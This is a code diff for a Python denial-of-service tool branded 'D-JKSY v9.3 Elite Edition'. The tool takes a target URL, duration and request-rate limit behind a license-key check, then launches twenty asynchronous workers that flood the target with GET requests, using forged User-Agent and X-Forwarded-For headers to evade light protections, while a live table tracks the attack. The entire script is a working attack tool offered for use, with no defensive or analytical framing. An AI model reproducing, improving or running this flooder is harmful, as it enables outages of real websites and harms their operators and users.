@@ -2,100 +2,100 @@ import asyncio, aiohttp, requests, time, os, sys
 from datetime import datetime
 from rich.console import Console
 from rich.panel import Panel
+from rich.table import Table
+from rich.live import Live
+from rich.layout import Layout
 from rich.text import Text
 
 console = Console()
-stats = {"total": 0, "success": 0, "failed": 0, "latency": 0}
+stats = {"total": 0, "success": 0, "failed": 0, "latency": 0, "rps": 0}
+
+def get_banner():
+    # ASCII Art JKSY untuk tampilan angker
+    banner = """
+[bold red]    ____          _______  ______驰
+   / __ \        / / ___/ / ____/
+  / / / /  __   / /\__ \ / / __  
+ / /_/ /  /_/  / /___/ // /_/ /  
+/_____/       /_//____/ \____/   [/]
+[bold white]   ELITE EDITION v9.3 - AUTHORITY BY JOKESKYLS[/]
+    """
+    return banner
+
+def generate_log_table(target):
+    # Membuat tabel statistik yang rapi dan simetris
+    table = Table(border_style="red", expand=True)
+    table.add_column("METRIC", style="cyan", justify="center")
+    table.add_column("VALUE", style="white", justify="center")
+    
+    table.add_row("TARGET", f"[bold yellow]{target}[/]")
+    table.add_row("TOTAL REQS", str(stats["total"]))
+    table.add_row("RPS", f"[bold magenta]{stats['rps']}[/]")
+    table.add_row("LATENCY", f"{stats['latency']:.0f}ms")
+    table.add_row("SUCCESS", f"[bold green]{stats['success']}[/]")
+    table.add_row("FAILED", f"[bold red]{stats['failed']}[/]")
+    return table
 
 async def attack_logic(url, rps_limit):
-    timeout = aiohttp.ClientTimeout(total=10)
-    delay = 1 / rps_limit if rps_limit > 0 else 0
-    
+    timeout = aiohttp.ClientTimeout(total=5)
+    delay = 1 / (rps_limit / 20) if rps_limit > 0 else 0
     async with aiohttp.ClientSession(timeout=timeout) as session:
         while True:
             t1 = time.perf_counter()
             try:
-                # Header Tier S untuk bypass proteksi ringan
-                headers = {
-                    "User-Agent": "D-JKSY/9.3 (Elite-User)",
-                    "X-Forwarded-For": f"{time.time()}"
-                }
+                headers = {"User-Agent": f"D-JKSY/9.3-{time.time()}", "X-Forwarded-For": f"1.{time.time()}"}
                 async with session.get(url, headers=headers) as resp:
                     stats["latency"] = (time.perf_counter() - t1) * 1000
                     stats["total"] += 1
-                    if resp.status < 400:
-                        stats["success"] += 1
-                    else:
-                        stats["failed"] += 1
+                    if resp.status < 400: stats["success"] += 1
+                    else: stats["failed"] += 1
             except:
                 stats["total"] += 1
                 stats["failed"] += 1
-            
-            if delay > 0:
-                await asyncio.sleep(delay)
-
-async def monitor(duration, target):
-    start_time = time.time()
-    last_total = 0
-    os.system('cls' if os.name == 'nt' else 'clear')
-    
-    banner = Text.assemble(
-        ("\n I AM JOKESKYLS ", "bold white on red"),
-        (" D-JKSY v9.3 ELITE EDITION ", "bold red on white")
-    )
-    console.print(banner, justify="center")
-    
-    console.print(Panel(
-        f"[bold white]TARGET  :[/][bold yellow] {target}\n"
-        f"[bold white]STATUS  :[/][bold green] ATTACKING (TIER S ACTIVE)\n"
-        f"[bold white]OWNER   :[/][bold red] @nazisme1930",
-        title="[bold cyan]D-JKSY CONTROL CENTER[/]"
-    ))
-
-    while time.time() - start_time < duration:
-        current_total = stats["total"]
-        rps = current_total - last_total
-        last_total = current_total
-        
-        now = datetime.now().strftime("%H:%M:%S")
-        console.print(
-            f"[dim]{now}[/] [bold cyan]RPS:[/] [white]{rps:<6}[/] "
-            f"[bold magenta]LATENCY:[/] [white]{stats['latency']:.0f}ms[/] "
-            f"[bold green]SUCCESS:[/] [white]{stats['success']}[/] "
-            f"[bold red]FAILED:[/] [white]{stats['failed']}[/]"
-        )
-        await asyncio.sleep(1)
+            if delay > 0: await asyncio.sleep(delay)
 
 async def main():
-    # 1. Cek Lisensi
+    # 1. AUTH SYSTEM
+    os.system('cls' if os.name == 'nt' else 'clear')
+    console.print(get_banner(), justify="center")
+    
     try:
         r = requests.get("https://raw.githubusercontent.com/iamkhy11/d-jksy/main/keys.txt", timeout=10)
         keys = [k.strip() for k in r.text.splitlines()]
     except:
-        console.print("[bold red][!] Gagal verifikasi lisensi (Koneksi Error).[/]")
+        console.print("[red][!] Authority Server Offline![/]")
         return
 
+    key_input = console.input("\n[bold white]ACCESS KEY : [/]").strip()
+    if key_input not in keys:
+        console.print("[bold red][!] UNKNOWN KEY. ACCESS DENIED.[/]")
+        return
+
+    # 2. INPUT PARAMETERS
+    console.print("\n[bold green][+] AUTHORITY GRANTED[/]")
+    target = console.input("[bold white]TARGET URL : [/]")
+    duration = int(console.input("[bold white]TIME (SEC) : [/]"))
+    rps_val = int(console.input("[bold white]RPS LIMIT  : [/]"))
+
+    # 3. LIVE MONITORING
     os.system('cls' if os.name == 'nt' else 'clear')
-    console.print(Panel("[bold red]D-JKSY v9.3 REMOTE AUTHORITY[/]"), justify="center")
+    console.print(get_banner(), justify="center")
     
-    key_input = console.input("\n[bold yellow][?][/] License Key: ").strip()
+    workers = [attack_logic(target, rps_val) for _ in range(20)]
     
-    if key_input in keys:
-        console.print("[bold green][+][/] Access Granted!")
-        time.sleep(1)
-        
-        # 2. Input Parameter
-        target = console.input("[bold cyan][?][/] Target URL: ")
-        duration = int(console.input("[bold cyan][?][/] Duration (sec): "))
-        rps_target = int(console.input("[bold cyan][?][/] RPS Limit (1-1000): "))
-        
-        # 3. Eksekusi
-        # Kita pakai 20 worker untuk membagi beban RPS
-        workers = [attack_logic(target, rps_target/20) for _ in range(20)]
-        
-        # Jalankan monitor dan attack bersamaan
-        await asyncio.gather(monitor(duration, target), *workers)
-        
-        console.print("\n[bold yellow][!] Attack Session Finished.[/]")
-    else:
-        console.print("[bold red][!][/] Access Denied. Contact @nazisme1930")
+    start_time = time.time()
+    last_total = 0
+    
+    with Live(generate_log_table(target), refresh_per_second=4) as live:
+        while time.time() - start_time < duration:
+            # Hitung RPS tiap detik
+            stats["rps"] = stats["total"] - last_total
+            last_total = stats["total"]
+            
+            live.update(generate_log_table(target))
+            await asyncio.sleep(1)
+
+    console.print("\n[bold red][!] OPERATION COMPLETE. DISCONNECTING...[/]")
+
+if __name__ == "__main__":
+    asyncio.run(main())
